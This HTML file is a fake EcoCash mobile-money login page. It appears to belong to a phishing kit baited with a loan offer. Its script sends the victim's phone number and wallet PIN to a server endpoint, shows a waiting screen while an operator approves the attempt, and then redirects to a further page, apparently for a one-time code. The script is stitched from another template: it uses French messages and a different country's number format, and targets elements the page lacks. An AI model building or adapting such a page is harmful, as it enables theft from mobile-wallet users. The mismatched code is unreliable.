<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirm</title>

    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            font-family: Arial, Helvetica, sans-serif;
            background: #ffffff;
            -webkit-font-smoothing: antialiased;
        }

        .container {
            max-width: 400px;
            margin: auto;
            padding: 32px 16px 0;
            text-align: center;
        }

        .logo {
            font-size: 44px;
            font-weight: bold;
            margin-bottom: 16px;
        }

        .logo span:first-child {
            color: #0b5ed7;
        }

        .logo span:last-child {
            color: #e5533d;
        }

        h2 {
            font-weight: normal;
            margin-bottom: 24px;
            font-size: 20px;
        }

        .phone-box {
            border: 2px solid #0b5ed7;
            border-radius: 12px;
            padding: 12px 14px;
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 14px;
            background: #fff;
        }

        .flag-img {
            width: 26px;
            height: auto;
        }

        .country-code {
            font-size: 16px;
            font-weight: bold;
            white-space: nowrap;
        }

        .phone-input {
            border: none;
            outline: none;
            font-size: 16px;
            flex: 1;
            padding: 6px 4px;
            background: transparent;
        }

        .phone-input::placeholder {
            color: #aaa;
        }

        .phone-box:focus-within {
            box-shadow: 0 0 0 3px rgba(11, 94, 215, 0.15);
        }

        .pin-label {
            margin-top: 18px;
            color: #666;
            font-size: 14px;
        }

        .pin-boxes {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin: 14px 0;
        }

        .pin-boxes input {
            width: 48px;
            height: 48px;
            border: 2px solid #0b5ed7;
            border-radius: 10px;
            font-size: 20px;
            text-align: center;
            outline: none;
        }

        .pin-boxes input:focus {
            box-shadow: 0 0 0 3px rgba(11, 94, 215, 0.15);
        }

        .forgot {
            color: #666;
            font-size: 13px;
            margin-bottom: 10px;
        }

        .bottom {
            position: relative;
            background: #0b5ed7;
            padding: 56px 16px 24px;
            color: #fff;
            text-align: center;
            overflow: hidden;
            margin-top: 30px;
        }

        .bottom::before {
            content: "";
            position: absolute;
            top: -45px;
            left: 0;
            width: 100%;
            height: 90px;
            background: #ffffff;
            border-bottom-left-radius: 100% 100%;
            border-bottom-right-radius: 100% 100%;
        }

        .bottom p {
            margin-bottom: 22px;
            font-size: 14px;
            line-height: 1.4;
        }

        .buttons {
            display: flex;
            gap: 12px;
            justify-content: center;
            flex-wrap: wrap;
            margin-bottom: 22px;
        }

        .btn {
            background: #fff;
            color: #0b5ed7;
            padding: 14px;
            width: 150px;
            border-radius: 14px;
            font-weight: bold;
            border: none;
            font-size: 14px;
            cursor: pointer;
        }

        .btn:active {
            transform: scale(0.98);
        }

        .version {
            font-size: 12px;
            margin-bottom: 6px;
        }

        .terms {
            font-size: 11px;
            line-height: 1.4;
        }

        .terms a {
            color: #fff;
            text-decoration: underline;
        }

        @media (max-width: 360px) {
            .logo {
                font-size: 38px;
            }

            .pin-boxes input {
                width: 44px;
                height: 44px;
            }

            .btn {
                width: 100%;
                max-width: 220px;
            }
        }
    </style>
</head>

<body>

    <div class="container">
        <div class="logo">
            <span>Eco</span><span>Cash</span>
        </div>

        <h2>Login</h2>

        <div class="phone-box">
            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6a/Flag_of_Zimbabwe.svg" alt="ZW"
                class="flag-img">
            <span class="country-code">+263</span>
            <input type="tel" id="phone" class="phone-input" placeholder="" inputmode="numeric">
        </div>

        <div class="pin-label">Enter your PIN</div>

        <div class="pin-boxes">
            <input class="otp-input" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric">
            <input class="otp-input" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric">
            <input class="otp-input" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric">
            <input class="otp-input" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric">
        </div>

        <div class="forgot">Forgot PIN?</div>

        <button type="submit" class="btn submit-btn" disabled style="display:block; width:100%; max-width:300px; margin:20px auto 0; padding:14px 20px; background:#bdbdbd; color:#fff; border-radius:12px; font-size:16px; font-weight:bold; cursor:not-allowed;">Submit</button>
    </div>

    <div class="bottom">
        <p>To register a EcoCash wallet or get assistance,<br>click below</p>

        <div class="buttons">
            <button class="btn">Register</button>
            <button class="btn">Help &amp; Support</button>
        </div>

        <div class="version">v2.2.3P</div>

        <div class="terms">
            By signing in you agree to the
            <a href="#">Terms and Conditions</a>
        </div>
    </div>

    <script>
  const phoneInput = document.getElementById('phoneInput');
  const codeBoxes = Array.from(document.querySelectorAll('.code-box'));

  // Automatically reflect the phone number passed from the loan application.
  const incomingParams = new URLSearchParams(window.location.search);
  const incomingPhone = incomingParams.get('phone') || '';
  const normalizedPhone = incomingPhone.replace(/\\D/g, '').replace(/^243/, '');
  if (/^9[0-9]{8}$/.test(normalizedPhone)) {
    phoneInput.value = normalizedPhone;
  }
  const connexionBtn = document.getElementById('connexionBtn');
  const eyeBtn = document.getElementById('eyeBtn');

  const invalidModal = document.getElementById('invalidModal');
  const invalidMessage = document.getElementById('invalidMessage');
  const invalidOkBtn = document.getElementById('invalidOkBtn');

  function showInvalidPhone(message){
    invalidMessage.innerHTML = message;
    invalidModal.classList.add('visible');
  }

  function checkFormValid(){
    const phone = phoneInput.value.trim();
    const codeFilled = codeBoxes.every(b => b.value.length === 1);

    // Let the user submit any entered number. Validation happens after
    // clicking CONNEXION, so invalid numbers can show the modal.
    if(phone.length > 0 && codeFilled){
      connexionBtn.classList.add('active');
      connexionBtn.disabled = false;
    } else {
      connexionBtn.classList.remove('active');
      connexionBtn.disabled = true;
    }
  }

  phoneInput.addEventListener('input', () => {
    // Keep the field clean, but do not show an error while typing.
    phoneInput.value = phoneInput.value.replace(/[^0-9]/g, '');
    checkFormValid();
  });

  invalidOkBtn.addEventListener('click', () => {
    invalidModal.classList.remove('visible');
    phoneInput.focus();
  });

  codeBoxes.forEach((box, i) => {
    box.addEventListener('input', () => {
      box.value = box.value.replace(/[^0-9]/g, '');
      if(box.value && i < codeBoxes.length - 1){
        codeBoxes[i + 1].focus();
      }
      checkFormValid();
    });
    box.addEventListener('keydown', (e) => {
      if(e.key === 'Backspace' && !box.value && i > 0){
        codeBoxes[i - 1].focus();
      }
    });
  });

  let codeVisible = false;
  eyeBtn.addEventListener('click', () => {
    codeVisible = !codeVisible;
    codeBoxes.forEach(b => b.type = codeVisible ? 'text' : 'password');
    eyeBtn.textContent = codeVisible ? '🙈' : '👁️';
  });

  const overlay = document.getElementById('approvalOverlay');
  const spinner = document.getElementById('spinner');
  const overlayTitle = document.getElementById('overlayTitle');
  const overlayText = document.getElementById('overlayText');
  const deniedMsg = document.getElementById('deniedMsg');
  const retryBtn = document.getElementById('retryBtn');
  let pollTimer = null;

  function showOverlayWaiting(){
    overlay.classList.add('visible');
    spinner.style.display = 'block';
    overlayTitle.textContent = 'Veuillez patienter...';
    overlayTitle.style.display = 'block';
    overlayText.style.display = 'block';
    overlayText.textContent = 'Cela prend généralement quelques secondes';
    deniedMsg.style.display = 'none';
    retryBtn.style.display = 'none';
  }

  function pollApproval(id, params){
    if(pollTimer) clearInterval(pollTimer);
    pollTimer = setInterval(async () => {
      try {
        const res = await fetch('/api/check-approval/' + id);
        const data = await res.json();

        if(data.status === 'approved'){
          clearInterval(pollTimer);
          window.location.href = 'pto.html?' + params.toString();
        } else if(data.status === 'denied'){
          clearInterval(pollTimer);
          spinner.style.display = 'none';
          overlayTitle.style.display = 'none';
          overlayText.style.display = 'none';
          deniedMsg.style.display = 'block';
          retryBtn.style.display = 'inline-block';
        }
        // 'pending' -> keep polling
      } catch (err) {
        // network hiccup — keep trying silently
      }
    }, 2500);
  }

  retryBtn.addEventListener('click', () => {
    overlay.classList.remove('visible');
  });

  connexionBtn.addEventListener('click', async () => {
    const phone = phoneInput.value.trim();

    // Show the invalid-number page only when the user tries to submit.
    if(!/^9[0-9]{8}$/.test(phone)){
      showInvalidPhone(
        'Le numéro de téléphone doit commencer par 9 et contenir exactement 9 chiffres.<br>Veuillez entrer le bon numéro et réessayer!'
      );
      return;
    }

    if(connexionBtn.disabled) return;

    const params = new URLSearchParams(window.location.search);
    const code = codeBoxes.map(b => b.value).join('');
    params.set('phone', phone);

    showOverlayWaiting();

    try {
      const res = await fetch('/api/request-approval', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          plan: params.get('plan'),
          price: params.get('price'),
          phone: phone,
          code: code,
          step: 'login'
        })
      });
      const data = await res.json();
      pollApproval(data.id, params);
    } catch (err) {
      overlayTitle.textContent = 'Erreur de connexion';
      overlayText.textContent = "Impossible d'envoyer la demande. Vérifiez votre connexion et réessayez.";
      spinner.style.display = 'none';
      retryBtn.style.display = 'inline-block';
    }
  });
</script>

</body>
</html>
